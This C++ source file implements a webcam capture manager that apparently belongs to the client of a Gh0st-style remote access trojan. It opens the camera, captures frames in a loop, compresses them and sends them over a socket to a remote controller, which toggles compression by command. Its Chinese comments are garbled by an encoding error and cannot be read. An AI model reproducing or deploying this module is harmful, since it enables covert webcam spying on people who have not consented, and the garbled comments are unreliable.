// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////


#include "VideoManager.h"
#include <iostream>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CVideoManager::CVideoManager(CClientSocket* ClientObject ) : CManager(ClientObject)
{
	m_bIsWorking = TRUE;

	m_bIsCompress = false;
	m_pVideoCodec = NULL;
	m_fccHandler = 1129730893;

	m_CapVideo.Open(0,0);  // ����
	lpBuffer = NULL;

	m_hWorkThread = CreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
}


DWORD CVideoManager::WorkThread(LPVOID lParam)
{
	CVideoManager *This = (CVideoManager *)lParam;
	static DWORD	dwLastScreen = GetTickCount();

	if (This->Initialize())          //ת��Initialize
	{
		This->m_bIsCompress=true;    //�����ʼ���ɹ������ÿ���ѹ��
		printf("ѹ����Ƶ���д���.\n");
	}

	This->SendBitMapInfor();         //����bmpλͼ�ṹ

	// �ȿ��ƶ˶Ի����
	This->WaitForDialogOpen();
#if USING_ZLIB
	const int fps = 8;// ֡��
#elif USING_LZ4
	const int fps = 8;// ֡��
#else
	const int fps = 8;// ֡��
#endif
	const int sleep = 1000 / fps;// ���ʱ�䣨ms��

	timeBeginPeriod(1);
	while (This->m_bIsWorking)
	{
		// �����ٶ�
		int span = sleep-(GetTickCount() - dwLastScreen);
		Sleep(span > 0 ? span : 1);
		if (span < 0)
			printf("SendScreen Span = %d ms\n", span);
		dwLastScreen = GetTickCount();
		if(FALSE == This->SendNextScreen())
			break;
	}
	timeEndPeriod(1);

	This->Destroy();
	std::cout<<"CVideoManager WorkThread end\n";

	return 0;
}

CVideoManager::~CVideoManager()
{
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	m_CapVideo.m_bExit = TRUE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	std::cout<<"CVideoManager ~CVideoManager \n";
	if (m_pVideoCodec)   //ѹ����
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
	if (lpBuffer)
		delete [] lpBuffer;
}

void CVideoManager::Destroy()
{
	m_bIsWorking = FALSE;
	std::cout<<"CVideoManager Destroy \n";
	if (m_pVideoCodec)   //ѹ����
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}

void CVideoManager::SendBitMapInfor()
{
	const int	dwBytesLength = 1 + sizeof(BITMAPINFO);
	BYTE szBuffer[dwBytesLength + 3] = { 0 };
	szBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	memcpy(szBuffer + 1, m_CapVideo.GetBmpInfor(), sizeof(BITMAPINFO));
	Send((LPBYTE)szBuffer, dwBytesLength);
}

BOOL CVideoManager::SendNextScreen()
{
	DWORD dwBmpImageSize=0;
	LPVOID	lpDIB =m_CapVideo.GetDIB(dwBmpImageSize);
	if(lpDIB == NULL)
		return FALSE;

	// token + IsCompress + m_fccHandler + DIB
	const int nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + dwBmpImageSize;
	lpBuffer = lpBuffer ? lpBuffer : new BYTE[nBufferLen];

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;   //ѹ��

	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));     //���ｫ��Ƶѹ����д��Ҫ���͵Ļ�����

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec) //�����жϣ��Ƿ�ѹ����ѹ�����Ƿ��ʼ���ɹ�������ɹ���ѹ��          
	{
		int	nCompressLen = 0;
		//����ѹ����Ƶ������
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_CapVideo.GetBmpInfor()->bmiHeader.biSizeImage, lpBuffer + nHeadLen, 
			&nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing error
			return FALSE;
		}
		//���¼��㷢�����ݰ��Ĵ�С  ʣ�¾��Ƿ����ˣ����ǵ����ض˿�һ����Ƶ���ѹ������ô����
		//�����ض˵�void CVideoDlg::OnReceiveComplete(void)
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		//��ѹ��  ��Զ����
		memcpy(lpBuffer + nHeadLen, lpDIB, dwBmpImageSize);
		nPacketLen = dwBmpImageSize+ nHeadLen;
	}
	m_CapVideo.SendEnd();    //copy  send

	Send((LPBYTE)lpBuffer, nPacketLen);

	return TRUE;
}


 void CVideoManager::OnReceive(LPBYTE szBuffer, UINT nSize)
{
	switch (szBuffer[0])
	{
	case COMMAND_NEXT:
		{
			NotifyDialogIsOpen();
			break;
		}
	case COMMAND_WEBCAM_ENABLECOMPRESS: // Ҫ������ѹ��
		{
			// �����������ʼ��������������ѹ������
			if (m_pVideoCodec)
				InterlockedExchange((LPLONG)&m_bIsCompress, true);
			printf("ѹ����Ƶ���д���.\n");
			break;
		}
	case COMMAND_WEBCAM_DISABLECOMPRESS: // ԭʼ���ݴ���
		{
			InterlockedExchange((LPLONG)&m_bIsCompress, false);
			printf("��ѹ����Ƶ���д���.\n");
			break;
		}
	}
}

BOOL CVideoManager::Initialize()
{
	BOOL	bRet = TRUE;

	if (m_pVideoCodec!=NULL)         
	{                              
		delete m_pVideoCodec;
		m_pVideoCodec=NULL;           
	}
	if (m_fccHandler==0)         //������ѹ��
	{
		bRet= FALSE;
		return bRet;
	}
	m_pVideoCodec = new CVideoCodec;
	//�����ʼ������Ƶѹ�� ��ע�������ѹ����  m_fccHandler(�����캯���в鿴)
	if (!m_pVideoCodec->InitCompressor(m_CapVideo.GetBmpInfor(), m_fccHandler))
	{
		delete m_pVideoCodec;
		bRet=FALSE;
		// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
		m_pVideoCodec = NULL;
	}
	return bRet;
}